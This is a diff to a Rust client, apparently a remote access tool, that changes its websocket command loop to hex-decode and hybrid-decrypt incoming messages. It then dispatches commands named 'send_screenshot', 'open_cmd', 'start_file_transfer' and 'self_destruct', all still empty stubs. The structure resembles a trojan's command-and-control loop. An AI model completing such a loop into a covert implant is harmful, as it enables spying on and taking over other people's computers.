@@ -2,7 +2,7 @@ mod file_reciever;
 mod hybrid_decryption;
 mod screenshot_sender;
 
-use std::{thread, time::Duration};
+use std::{str::from_utf8, thread, time::Duration};
 
 use futures_util::{
     stream::{SplitSink, SplitStream},
@@ -97,19 +97,30 @@ impl Connector {
     }
     pub async fn subscribe_to_updates(&mut self) {
         loop {
-            if let Some(message) = self.read.as_mut().unwrap().next().await {
-                let decrypted_message = self.decrypt_data(message.unwrap().to_string().as_bytes());
-                match decrypted_message.as_str() {
-                    "update" => {
-                        println!("got an update request");
-                    }
-                    "start_file_transfer" => {}
-                    "send_screenshot" => {}
-                    "open_cmd" => {}
-                    "self_destruct" => {}
-                    _ => {
-                        println!("Got unrecognisible command, message:{}", decrypted_message)
-                    }
+            let mut hybrid_decryption_arguments: [Vec<u8>; 3] =
+                [Vec::new(), Vec::new(), Vec::new()];
+            for index in 0..3 {
+                if let Some(message) = self.read.as_mut().unwrap().next().await {
+                    hybrid_decryption_arguments[index] =
+                        hex::decode(message.unwrap().to_string()).unwrap();
+                }
+            }
+            let hybrid_decryption = HybridDecryption::new(
+                hybrid_decryption_arguments[0].clone(),
+                hybrid_decryption_arguments[1].clone(),
+                hybrid_decryption_arguments[2].clone(),
+            );
+            let decrypted_message = hybrid_decryption.decrypt(self.private_key.clone());
+            match decrypted_message.as_str() {
+                "update" => {
+                    println!("got an update request");
+                }
+                "start_file_transfer" => {}
+                "send_screenshot" => {}
+                "open_cmd" => {}
+                "self_destruct" => {}
+                _ => {
+                    println!("Got unrecognisible command, message:{}", decrypted_message)
                 }
             }
         }
@@ -130,11 +141,12 @@ impl Connector {
                 .await
                 .unwrap();
 
-            let mut hybrid_decryption_arguments: [String; 3] =
-                ["".to_string(), "".to_string(), "".to_string()];
+            let mut hybrid_decryption_arguments: [Vec<u8>; 3] =
+                [Vec::new(), Vec::new(), Vec::new()];
             for index in 0..3 {
                 if let Some(message) = self.read.as_mut().unwrap().next().await {
-                    hybrid_decryption_arguments[index] = message.unwrap().to_string();
+                    hybrid_decryption_arguments[index] =
+                        hex::decode(message.unwrap().to_string()).unwrap();
                 }
             }
             let hybrid_decryption = HybridDecryption::new(
